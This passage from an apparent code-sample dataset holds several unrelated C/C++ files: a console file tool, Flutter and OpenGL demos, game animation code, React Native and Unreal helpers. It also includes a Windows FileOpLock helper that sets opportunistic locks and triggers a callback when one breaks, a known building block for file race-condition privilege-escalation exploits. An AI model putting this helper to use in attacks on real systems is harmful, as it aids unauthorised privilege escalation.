endl;\n\t\t\t\t\tcin >> pathS;\n\n\t\t\t\t\tstring pathEX = (pathP + pathS + pathF); // setting name of file\n\n\t\t\t\t\tFileWrite.open(pathEX);\n\t\t\t\t\tif (FileWrite.is_open()) {\n\n\t\t\t\t\t\tchar symbol = ' ';\n\n\t\t\t\t\t\tcout << endl << \"enter your text\" << endl;\n\t\t\t\t\t\tcin.get();\n\t\t\t\t\t\tgetline(cin, TextPath.Text);\n\t\t\t\t\t\t\n\t\t\t\t\t\tFileWrite << TextPath.Text;\n\n\t\t\t\t\t\tFileWrite.close();\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tcout << endl << \"cant open file\" << endl;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\telse if (SecondL.Command == arrWrtCom[1]) { //function to write without path\n\t\t\t\t\tioClass insideUnpathWrt;\n\t\t\t\t\tTextWork TextUnpath;\n\t\t\t\t\t\n\t\t\t\t\tFileWrite.open(FileName);\n\n\t\t\t\t\tif (FileWrite.is_open()) {\n\n\t\t\t\t\t\tTextUnpath.Text;                   //var text\n\n\t\t\t\t\t\tcout << endl << endl;\n\t\t\t\t\t\tcout << \"enter your text\";\n\t\t\t\t\t\tcout << endl << endl;\n\t\t\t\t\t\t\n\t\t\t\t\t\tcin.get();\n\t\t\t\t\t\tgetline(cin, TextUnpath.Text);\n\t\t\t\t\t\t\n\t\t\t\t\t\tFileWrite << TextUnpath.Text;\n\n\n\t\t\t\t\t\tFileWrite.close();\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tcout << endl << endl <<endl;\n\t\t\t\t\t\tcout << \"cant open file\";\n\t\t\t\t\t\tcout << endl << endl << endl;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\telse if (SecondL.Command == arrWrtCom[2]) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\telse if (FirstL.Command == ArrMan[4]) { // algorithm to function of read and find in file\n\t\t\tGet_CLS();\n\t\t\tioClass SlineRd;\n\n\t\t\tifstream fileToRead;\n\n\t\t\tstring ComArray[] = { \"/start\", \"/find\", \"/brk\" }; // list of command\n\n\t\t\twhile (true) {\n\t\t\t\tcout << \"Path: -> main -> read\" << endl << endl;\n\n\t\t\t\tcout << \"'/start' to simple read file, '/find' to find a symbol in file, '/brk' to exit from this command line\" << endl;\n\t\t\t\tcin >> SlineRd.Command;\n\t\t\t\tSlineRd.ChSlash();\n\n\t\t\t\tif (SlineRd.Command == ComArray[0]) {\n\t\t\t\t\tioClass insideRead;\n\n\t\t\t\t\tTextWork TextINSRead;\n\n\t\t\t\t\tstring nameFileF = \"Page/\";\n\t\t\t\t\tstring nameFileS;\n\t\t\t\t\tstring nameFileT = \".txt\";\n\n\t\t\t\t\tcout << endl << \"enter name of your file.\" << endl;\n\t\t\t\t\tcin >> nameFileS;\n\n\t\t\t\t\tstring nameFileE = (nameFileF + nameFileS + nameFileT);\n\n\t\t\t\t\tfileToRead.open(nameFileE);\n\n\t\t\t\t\tif (fileToRead.is_open()) {\n\n\t\t\t\t\t\tTextINSRead.Text;\n\n\t\t\t\t\t\tcout << endl << \"file is open\" << endl;\n\n\t\t\t\t\t\tfileToRead >> TextINSRead.Text;\n\n\t\t\t\t\t\tcout << endl << endl << TextINSRead.Text << endl << endl;\n\n\t\t\t\t\t\t\n\t\t\t\t\t\tfileToRead.close();\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tcout << endl << endl << endl << \"file cant be opened\" << endl << endl << endl;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\telse if (SlineRd.Command == ComArray[1]) { // algorithm to find a symbols in file\n\t\t\t\t\tioClass insideFind;\n\t\t\t\t\tTextWork TextInsideFind;\n\n\t\t\t\t\tstring nameFileF = \"Page/\";\n\t\t\t\t\tstring nameFileS;\n\t\t\t\t\tstring nameFileT = \".txt\";\n\n\t\t\t\t\tcout << endl << \"enter name of your file\" << endl;\n\t\t\t\t\tcin >> nameFileS;\n\t\t\t\t\t\n\t\t\t\t\tstring nameFileE = (nameFileF + nameFileS + nameFileT);\n\t\t\t\t\t\n\t\t\t\t\tfileToRead.open(nameFileE);\n\n\t\t\t\t\tif (fileToRead.is_open()) {\n\n\t\t\t\t\t\tTextInsideFind.Text;\n\t\t\t\t\t\tlong count = 0;\n\n\t\t\t\t\t\tcout << endl << \"file is open\" << endl;\n\t\t\t\t\t\tfileToRead >> TextInsideFind.Text;\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\tfor (int i = 0; i < sizeof(TextInsideFind.Text); i++) { // loop for calculate numbers of specSymbols in array\n\t\t\t\t\t\t\tif(TextInsideFind.Text[i] == insideFind.arrSymbols[0]) {\n\t\t\t\t\t\t\t\tcount++;\n\n\t\t\t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"second_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GL/glut.h>\n\n// Shearing parameters\nGLfloat shearXY = 0.0f;\nGLfloat shearXZ = 0.0f;\nGLfloat shearYX = 0.0f;\nGLfloat shearYZ = 0.0f;\nGLfloat shearZX = 0.0f;\nGLfloat shearZY = 0.0f;\n\nvoid initGL() {\n    glClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n    glEnable(GL_DEPTH_TEST);\n}\n\nvoid multiplyMatrices(const GLfloat a[16], const GLfloat b[16], GLfloat result[16]) {\n    for (int row = 0; row < 4; ++row) {\n        for (int col = 0; col < 4; ++col) {\n            result[row * 4 + col] =\n                a[row * 4 + 0] * b[0 * 4 + col] +\n                a[row * 4 + 1] * b[1 * 4 + col] +\n                a[row * 4 + 2] * b[2 * 4 + col] +\n                a[row * 4 + 3] * b[3 * 4 + col];\n        }\n    }\n}\n\nvoid createShearMatrix(GLfloat shearXY, GLfloat shearXZ, GLfloat shearYX, GLfloat shearYZ, GLfloat shearZX, GLfloat shearZY, GLfloat matrix[16]) {\n    matrix[0] = 1.0f; matrix[4] = shearXY; matrix[8] = shearXZ; matrix[12] = 0.0f;\n    matrix[1] = shearYX; matrix[5] = 1.0f; matrix[9] = shearYZ; matrix[13] = 0.0f;\n    matrix[2] = shearZX; matrix[6] = shearZY; matrix[10] = 1.0f; matrix[14] = 0.0f;\n    matrix[3] = 0.0f; matrix[7] = 0.0f; matrix[11] = 0.0f; matrix[15] = 1.0f;\n}\n\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glLoadIdentity();\n    glTranslatef(0.0f, 0.0f, -5.0f);\n\n    GLfloat shearMatrix[16];\n    createShearMatrix(shearXY, shearXZ, shearYX, shearYZ, shearZX, shearZY, shearMatrix);\n\n    // Apply the shear matrix\n    glMultMatrixf(shearMatrix);\n\n    // Draw a cube\n    glBegin(GL_QUADS);\n\n    // Front face\n    glColor3f(1.0f, 0.0f, 0.0f);\n    glVertex3f(-0.5f, -0.5f, 0.5f);\n    glVertex3f(0.5f, -0.5f, 0.5f);\n    glVertex3f(0.5f, 0.5f, 0.5f);\n    glVertex3f(-0.5f, 0.5f, 0.5f);\n\n    // Back face\n    glColor3f(0.0f, 1.0f, 0.0f);\n    glVertex3f(-0.5f, -0.5f, -0.5f);\n    glVertex3f(0.5f, -0.5f, -0.5f);\n    glVertex3f(0.5f, 0.5f, -0.5f);\n    glVertex3f(-0.5f, 0.5f, -0.5f);\n\n    // Top face\n    glColor3f(0.0f, 0.0f, 1.0f);\n    glVertex3f(-0.5f, 0.5f, -0.5f);\n    glVertex3f(0.5f, 0.5f, -0.5f);\n    glVertex3f(0.5f, 0.5f, 0.5f);\n    glVertex3f(-0.5f, 0.5f, 0.5f);\n\n    // Bottom face\n    glColor3f(1.0f, 1.0f, 0.0f);\n    glVertex3f(-0.5f, -0.5f, -0.5f);\n    glVertex3f(0.5f, -0.5f, -0.5f);\n    glVertex3f(0.5f, -0.5f, 0.5f);\n    glVertex3f(-0.5f, -0.5f, 0.5f);\n\n    // Right face\n    glColor3f(1.0f, 0.0f, 1.0f);\n    glVertex3f(0.5f, -0.5f, -0.5f);\n    glVertex3f(0.5f, 0.5f, -0.5f);\n    glVertex3f(0.5f, 0.5f, 0.5f);\n    glVertex3f(0.5f, -0.5f, 0.5f);\n\n    // Left face\n    glColor3f(0.0f, 1.0f, 1.0f);\n    glVertex3f(-0.5f, -0.5f, -0.5f);\n    glVertex3f(-0.5f, 0.5f, -0.5f);\n    glVertex3f(-0.5f, 0.5f, 0.5f);\n    glVertex3f(-0.5f, -0.5f, 0.5f);\n\n    glEnd();\n\n    glutSwapBuffers();\n}\n\nvoid reshape(int w, int h) {\n    glViewport(0, 0, w, h);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluPerspective(45.0, (double)w / (double)h, 1.0, 100.0);\n    glMatrixMode(GL_MODELVIEW);\n}\n\nvoid keyboard(unsigned char key, int x, int y) {\n    switch (key) {\n        case 'q': shearXY += 0.1f; break;\n        case 'a': shearXY -= 0.1f; break;\n        case 'w': shearXZ += 0.1f; break;\n        case 's': shearXZ -= 0.1f; break;\n        case 'e': shearYX += 0.1f; break;\n        case 'd': shearYX -= 0.1f; break;\n        case 'r': shearYZ += 0.1f; break;\n        case 'f': shearYZ -= 0.1f; break;\n        case 't': shearZX += 0.1f; break;\n        case 'g': shearZX -= 0.1f; break;\n        case 'y': shearZY += 0.1f; break;\n        case 'h': shearZY -= 0.1f; break;\n        case 27: exit(0); break; // ESC key to exit\n    }\n    glutPostRedisplay();\n}\n\nint main(int argc, char** argv) {\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);\n    glutInitWindowSize(800, 600);\n    glutInitWindowPosition(100, 100);\n    glutCreateWindow(\"3D Shearing Example\");\n\n    initGL();\n\n    glutDisplayFunc(display);\n    glutReshapeFunc(reshape);\n    glutKeyboardFunc(keyboard);\n\n    glutMainLoop();\n    return 0;\n}\n",
    "\n#include \"FileOpLock.h\"\n#include <threadpoolapiset.h>\n\n\n\nFileOpLock::FileOpLock(UserCallback cb) :\n\tg_inputBuffer({ 0 }), g_outputBuffer({ 0 }), g_o({ 0 }), g_hFile(INVALID_HANDLE_VALUE), g_hLockCompleted(nullptr), g_wait(nullptr), _cb(cb)\n{\n\tg_inputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;\n\tg_inputBuffer.StructureLength = sizeof(g_inputBuffer);\n\tg_inputBuffer.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;\n\tg_inputBuffer.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;\n\tg_outputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;\n\tg_outputBuffer.StructureLength = sizeof(g_outputBuffer);\n}\n\n\nFileOpLock::~FileOpLock()\n{\n\tif (g_wait)\n\t{\n\t\tSetThreadpoolWait(g_wait, nullptr, nullptr);\n\t\tCloseThreadpoolWait(g_wait);\n\t\tg_wait = nullptr;\n\t}\n\n\tif (g_o.hEvent)\n\t{\n\t\tCloseHandle(g_o.hEvent);\n\t\tg_o.hEvent = nullptr;\n\t}\n\n\tif (g_hFile != INVALID_HANDLE_VALUE)\n\t{\n\t\tCloseHandle(g_hFile);\n\t\tg_hFile = INVALID_HANDLE_VALUE;\n\t}\n}\nbool FileOpLock::BeginLock(const std::wstring& filename)\n{\n\tg_hLockCompleted = CreateEvent(nullptr, TRUE, FALSE, nullptr);\n\tg_o.hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);\n\n\n\n\tg_hFile = CreateFileW(filename.c_str(), GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,\n\t\t0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);\n\tif (g_hFile == INVALID_HANDLE_VALUE) {\n\n\t\treturn false;\n\t}\n\n\tg_wait = CreateThreadpoolWait(WaitCallback, this, nullptr);\n\tif (g_wait == nullptr)\n\t{\n\n\t\treturn false;\n\t}\n\n\tSetThreadpoolWait(g_wait, g_o.hEvent, nullptr);\n\n\tDeviceIoControl(g_hFile, FSCTL_REQUEST_OPLOCK,\n\t\t&g_inputBuffer, sizeof(g_inputBuffer),\n\t\t&g_outputBuffer, sizeof(g_outputBuffer),\n\t\tnullptr, &g_o);\n\tif (GetLastError() != ERROR_IO_PENDING) {\n\n\t\treturn false;\n\t}\n\n\treturn true;\n}\nbool FileOpLock::BeginLock(HANDLE hfile)\n{\n\tg_hLockCompleted = CreateEvent(nullptr, TRUE, FALSE, nullptr);\n\tg_o.hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);\n\n\n\n\tg_hFile = hfile;\n\tif (g_hFile == INVALID_HANDLE_VALUE) {\n\n\t\treturn false;\n\t}\n\n\tg_wait = CreateThreadpoolWait(WaitCallback, this, nullptr);\n\tif (g_wait == nullptr)\n\t{\n\n\t\treturn false;\n\t}\n\n\tSetThreadpoolWait(g_wait, g_o.hEvent, nullptr);\n\tDWORD bytesReturned;\n\n\tDeviceIoControl(g_hFile, FSCTL_REQUEST_OPLOCK,\n\t\t&g_inputBuffer, sizeof(g_inputBuffer),\n\t\t&g_outputBuffer, sizeof(g_outputBuffer),\n\t\tnullptr, &g_o);\n\t/*DeviceIoControl(g_hFile,\n\t\tFSCTL_REQUEST_OPLOCK_LEVEL_1,\n\t\tNULL, 0,\n\t\tNULL, 0,\n\t\t&bytesReturned,\n\t\t&g_o);*/\n\tif (GetLastError() != ERROR_IO_PENDING) {\n\n\t\treturn false;\n\t}\n\n\treturn true;\n}\nFileOpLock* FileOpLock::CreateLock(const std::wstring& name, FileOpLock::UserCallback cb)\n{\n\tFileOpLock* ret = new FileOpLock(cb);\n\n\tif (ret->BeginLock(name))\n\t{\n\t\treturn ret;\n\t}\n\telse\n\t{\n\t\tdelete ret;\n\t\treturn nullptr;\n\t}\n}\nFileOpLock* FileOpLock::CreateLock(HANDLE hfile, FileOpLock::UserCallback cb)\n{\n\tFileOpLock* ret = new FileOpLock(cb);\n\n\tif (ret->BeginLock(hfile))\n\t{\n\t\treturn ret;\n\t}\n\telse\n\t{\n\t\tdelete ret;\n\t\treturn nullptr;\n\t}\n}\nvoid FileOpLock::WaitForLock(UINT Timeout)\n{\n\tWaitForSingleObject(g_hLockCompleted, Timeout);\n}\n\nvoid FileOpLock::WaitCallback(PTP_CALLBACK_INSTANCE Instance,\n\tPVOID Parameter, PTP_WAIT Wait,\n\tTP_WAIT_RESULT WaitResult)\n{\n\tUNREFERENCED_PARAMETER(Instance);\n\tUNREFERENCED_PARAMETER(Wait);\n\tUNREFERENCED_PARAMETER(WaitResult);\n\n\tFileOpLock* lock = reinterpret_cast<FileOpLock*>(Parameter);\n\n\tlock->DoWaitCallback();\n}\nvoid FileOpLock::WaitCallback2(PTP_CALLBACK_INSTANCE Instance,\n\tPVOID Parameter, PTP_WAIT Wait,\n\tTP_WAIT_RESULT WaitResult)\n{\n\tUNREFERENCED_PARAMETER(Instance);\n\tUNREFERENCED_PARAMETER(Wait);\n\tUNREFERENCED_PARAMETER(WaitResult);\n\n\tFileOpLock* lock = reinterpret_cast<FileOpLock*>(Parameter);\n\n\tlock->DoWaitCallbackt();\n}\nvoid FileOpLock::DoWaitCallbackt()\n{\n\tDWORD dwBytes;\n\tif (!GetOverlappedResult(g_hFile, &g_o, &dwBytes, TRUE)) {\n\n\t}\n\n\tif (_cb)\n\t{\n\t\t_cb();\n\t}\n\tg_hFile = INVALID_HANDLE_VALUE;\n\tSetEvent(g_hLockCompleted);\n}\nvoid FileOpLock::DoWaitCallback()\n{\n\tDWORD dwBytes;\n\tif (!GetOverlappedResult(g_hFile, &g_o, &dwBytes, TRUE)) {\n\n\t}\n\n\tif (_cb)\n\t{\n\t\t_cb();\n\t}\n\n\n\tCloseHandle(g_hFile);\n\tg_hFile = INVALID_HANDLE_VALUE;\n\tSetEvent(g_hLockCompleted);\n}\n",
    "#include \"Framework.h\"\n#include \"Player.h\"\n\nPlayer::Player(Vector3 position, Vector3 size)\n{\n\tplayer = new AnimationRect(position, size);\n\tanimator = new Animator();\n\n\t{\n\t\t// \ub300\uae30\n\t\tTexture2D* srcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerIdleBT.png\");\n\t\t// PlayerIdle\n\t\tAnimationClip* IdleBT = new AnimationClip(L\"IdleBT\", srcTex, 4, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(IdleBT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerIdleUP.png\");\n\t\tAnimationClip* IdleUP = new AnimationClip(L\"IdleUP\", srcTex, 4, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(IdleUP);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerIdleRT.png\");\n\t\tAnimationClip* IdleRT = new AnimationClip(L\"IdleRT\", srcTex, 4, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(IdleRT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerIdleLT.png\");\n\t\tAnimationClip* IdleLT = new AnimationClip(L\"IdleLT\", srcTex, 4, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(IdleLT);\n\t\tSAFE_DELETE(srcTex);\n\n\n\t\t// \uac77\uae30\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerRunBT.png\");\n\t\t// PlayerRun\n\t\tAnimationClip* RunBT = new AnimationClip(L\"RunBT\", srcTex, 6, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(RunBT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerRunUP.png\");\n\t\tAnimationClip* RunUP = new AnimationClip(L\"RunUP\", srcTex, 6, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(RunUP);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerRunRT.png\");\n\t\tAnimationClip* RunRT = new AnimationClip(L\"RunRT\", srcTex, 6, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(RunRT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerRunLT.png\");\n\t\tAnimationClip* RunLT = new AnimationClip(L\"RunLT\", srcTex, 6, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(RunLT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\t// \uacf5\uaca9\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerAttackBT.png\");\n\t\t// PlayerAttack\n\t\tAnimationClip* AttackBT = new AnimationClip(L\"AttackBT\", srcTex, 7, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(AttackBT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerAttackUP.png\");\n\t\tAnimationClip* AttackUP = new AnimationClip(L\"AttackUP\", srcTex, 7, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(AttackUP);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerAttackRT.png\");\n\t\tAnimationClip* AttackRT = new AnimationClip(L\"AttackRT\", srcTex, 7, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(AttackRT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerAttackLT.png\");\n\t\tAnimationClip* AttackLT = new AnimationClip(L\"AttackLT\", srcTex, 7, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(AttackLT);\n\t\tSAFE_DELETE(srcTex);\n\n\n\t\t// \uc8fd\uc74c\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerDieBT.png\");\n\t\t// PlayerDie\n\t\tAnimationClip* DieBT = new AnimationClip(L\"DieBT\", srcTex, 9, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(DieBT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerDieUP.png\");\n\t\tAnimationClip* DieUP = new AnimationClip(L\"DieUP\", srcTex, 9, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(DieUP);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerDieRT.png\");\n\t\tAnimationClip* DieRT = new AnimationClip(L\"DieRT\", srcTex, 9, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(DieRT);\n\t\tSAFE_DELETE(srcTex);\n\n\t\tsrcTex = new Texture2D(TexturePath + L\"Player/swordman/PlayerDieLT.png\");\n\t\tAnimationClip* DieLT = new AnimationClip(L\"DieLT\", srcTex, 9, { 0, 0 }, { srcTex->GetWidth(), srcTex->GetHeight() });\n\t\tanimator->AddAnimClip(DieLT);\n\t\tSAFE_DELETE(srcTex);\n\t}\n\n\t// \uae30\ubcf8 \uc560\ub2c8\uba54\uc774\uc158 \uc124\uc815\n\tanimator->SetCurrentAnimClip(L\"IdleBT\");\n\n\t// \uc560\ub2c8\uba54\uc774\ud130 \uac08\uc544\ub07c\uc6b0\uae30\n\tplayer->SetAnimator(animator);\n}\n\nPlayer::~Player()\n{\n\tSAFE_DELETE(player);\n}\n\nvoid Player::Update()\n{\n\tplayer->Update();\n}\n\nvoid Player::Render()\n{\n\tplayer->Render();\n}\n\nvoid Player::Move()\n{\n\t// \ub300\uae30 (\uae30\ubcf8\uc0c1\ud0dc & \uac77\uae30 \ud6c4 \uba48\ucda4\uc0c1\ud0dc)\n\tif (Keyboard::Get()->Down('S') || Keyboard::Get()->Up('S') || (Keyboard::Get()->Up(0x0001) && direction == 0))\n\t{\n\t\tplayer->GetAnimator()->SetCurrentAnimClip(L\"IdleBT\");\n\t\tdirection = 0;\n\t}\n\telse if (Keyboard::Get()->Down('W') || Keyboard::Get()->Up('W') || (Keyboard::Get()->Up(0x0001) && direction == 1))\n\t{\n\t\tplayer->GetAni",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * This source code is licensed under the MIT license found in the\n * LICENSE file in the root directory of this source tree.\n */\n\n#include \"JSBundleType.h\"\n\nnamespace facebook::react {\n\nstatic uint32_t constexpr RAMBundleMagicNumber = 0xFB0BD1E5;\n\n// \"Hermes\" in ancient Greek encoded in UTF-16BE and truncated to 8 bytes.\nstatic uint64_t constexpr HermesBCBundleMagicNumber = 0x1F1903C103BC1FC6;\n\nScriptTag parseTypeFromHeader(const BundleHeader& header) {\n  switch (header.magic32.value) {\n    case RAMBundleMagicNumber:\n      return ScriptTag::RAMBundle;\n    default:\n      return ScriptTag::String;\n  }\n}\n\nconst char* stringForScriptTag(const ScriptTag& tag) {\n  switch (tag) {\n    case ScriptTag::String:\n      return \"String\";\n    case ScriptTag::RAMBundle:\n      return \"RAM Bundle\";\n  }\n  return \"\";\n}\n\nbool isHermesBytecodeBundle(const BundleHeader& header) {\n  return header.magic64 == HermesBCBundleMagicNumber;\n}\n\n} // namespace facebook::react\n",
    "#include \"stdint.h\"\n#include \"stdio.h\"\n#include \"stdlib.h\"\n\n//#define NULL 0\nuint32_t size;\n\ntypedef struct buffer_t\n{\n    \n    void* ptr;\n    struct buffer_t* next;\n\n}buffer_t;\n\nbuffer_t* buff_last(buffer_t* head)\n{\n    buffer_t* itr = head;\n\n    while (itr->next != NULL)\n    {\n        itr = itr->next;\n    }\n\n    return itr;\n}\n\nbuffer_t* buff_create(void)\n{\n    buffer_t* root = (buffer_t*)malloc(sizeof(buffer_t));\n    root->next = NULL;\n    root->ptr = NULL;\n    size = 1;\n    return root;\n}\n\nvoid buff_append(buffer_t** head, void* ptr)\n{   \n    if( *head == NULL)\n    {\n     *head = buff_create();\n    }\n    if ((*head)->ptr == NULL)\n    {\n        (*head)->ptr = ptr;\n        return;\n    }\n    else\n    {\n        buffer_t* itr = buff_last(*head);\n        buffer_t* Nelem = (buffer_t*)malloc(sizeof(buffer_t));\n        \n        /// insert new element \n        Nelem->next = NULL;\n        Nelem->ptr = ptr;\n        itr->next = Nelem;\n        size++;\n\n    }\n\n\n\n}\n\nvoid* buf_top(buffer_t* head)\n{\n    if (head != NULL)\n        return (head->ptr);\n    else\n        return NULL;\n\n}\n\n\nvoid buff_pop(buffer_t** head)\n{\n    buffer_t* itr = *head;\n    *head = itr->next;\n    free(itr);\n    size--;\n\n}\n\n\nvoid buff_print(buffer_t** root)\n{\n    uint32_t temp;\n    while (*root != NULL)\n    {\n        temp = *(uint32_t*)(buf_top(*root));\n        printf(\"val:%d\\r\\n\", temp);\n        buff_pop(root);\n    }\n}\n\n\n\nbuffer_t* root = NULL;\nuint32_t x = 1, y = 2, z = 3,h=4;\n\nint main()\n{\n\n    \n    buff_append(&root, &x);\n    buff_append(&root, &y);\n    buff_append(&root, &z);\n    buff_print(&root);\n    buff_append(&root, &h);\n    buff_print(&root);\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"Helper.h\"\n#include <Eigen/Core>\n#include <sstream>\n\nusing namespace Eigen;\n\nvoid UHelper::ConvertCoordinateSystem(FTransform& Transform, const EAxis SrcXInDstAxis, const EAxis SrcYInDstAxis, const EAxis SrcZInDstAxis)\n{\n    // Unreal Engine:\n    //   Front : X\n    //   Right : Y\n    //   Up    : Z\n    //\n    // OpenCV:\n    //   Front : Z\n    //   Right : X\n    //   Up    : Yn\n\n    FMatrix M12 = FMatrix::Identity;\n\n    M12.SetColumn(0, UnitVectorFromAxisEnum(SrcXInDstAxis));\n    M12.SetColumn(1, UnitVectorFromAxisEnum(SrcYInDstAxis));\n    M12.SetColumn(2, UnitVectorFromAxisEnum(SrcZInDstAxis));\n\t\n    Transform.SetFromMatrix(M12.GetTransposed() * Transform.ToMatrixWithScale() * M12);\n}\n\nFTransform UHelper::ConvertUnrealToOpenCV(FTransform Transform)\n{\n    ConvertCoordinateSystem(Transform, EAxis::Y, EAxis::Zn, EAxis::X);\n    return Transform;\n}\n\nFTransform UHelper::ConvertOpenCVToUnreal(FTransform Transform)\n{\n    ConvertCoordinateSystem(Transform, EAxis::Z, EAxis::X, EAxis::Yn);\n    return Transform;\n}\n\nMatrix3d UHelper::rodrigues(const Vector3d& rvec) {\n    double theta = rvec.norm();\n    Vector3d axis = rvec.normalized();\n    Matrix3d axis_cross;\n    axis_cross << 0, -axis(2), axis(1),\n                  axis(2), 0, -axis(0),\n                  -axis(1), axis(0), 0;\n    return Matrix3d::Identity() + std::sin(theta) * axis_cross + (1 - std::cos(theta)) * axis_cross * axis_cross;\n}\n\ndouble UHelper::variance(const VectorXd& vec)\n{\n    double mean = vec.mean();\n    double var = 0.0;\n    for (int i = 0; i < vec.size(); ++i) {\n        var += (vec(i) - mean) * (vec(i) - mean);\n    }\n    return var / vec.size();\n}\n\nFVector UHelper::eigenVectorToUnreal(const Vector3d& vec)\n{\n    return FVector(vec.x(), vec.y() ,vec.z());\n}\n\nFMatrix UHelper::eigenMatrixToUnreal(const Matrix4d& mat)\n{\n    FMatrix uMat;\n    uMat.M[0][0] = mat(0,0);\n    uMat.M[0][1] = mat(0,1);\n    uMat.M[0][2] = mat(0,2);\n    uMat.M[0][3] = mat(0,3);\n    uMat.M[1][0] = mat(1,0);\n    uMat.M[1][1] = mat(1,1);\n    uMat.M[1][2] = mat(1,2);\n    uMat.M[1][3] = mat(1,3);\n    uMat.M[2][0] = 